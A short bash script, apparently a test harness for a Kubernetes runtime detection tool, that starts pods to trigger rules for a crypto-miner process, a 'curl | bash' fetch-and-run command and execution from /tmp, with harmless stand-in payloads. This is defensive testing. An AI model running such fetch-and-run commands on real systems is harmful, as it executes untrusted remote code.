#!/bin/bash
echo "[*] KubeCustos Attack Simulation Script (for OKE Cluster)"

echo "[+] Testing Rule 1: Crypto Miner Detection (xmrig)"
# We create a pod that simulates a miner by name
kubectl run xmrig-test --image=alpine --restart=Never -- /bin/sh -c "echo 'simulating xmrig' && sleep 10"
sleep 2 # Give time for the execve to be captured
kubectl delete pod xmrig-test --wait=false

echo "[+] Testing Rule 2: Supply Chain Attack (curl | bash)"
kubectl run curl-bash-test --image=alpine --restart=Never -- /bin/sh -c "curl -s example.com | bash"
sleep 2
kubectl delete pod curl-bash-test --wait=false

echo "[+] Testing Rule 3: Execution from /tmp"
kubectl run tmp-exec-test --image=alpine --restart=Never -- /bin/sh -c "touch /tmp/malware && chmod +x /tmp/malware && /tmp/malware"
sleep 2
kubectl delete pod tmp-exec-test --wait=false

echo "[*] Simulation finished."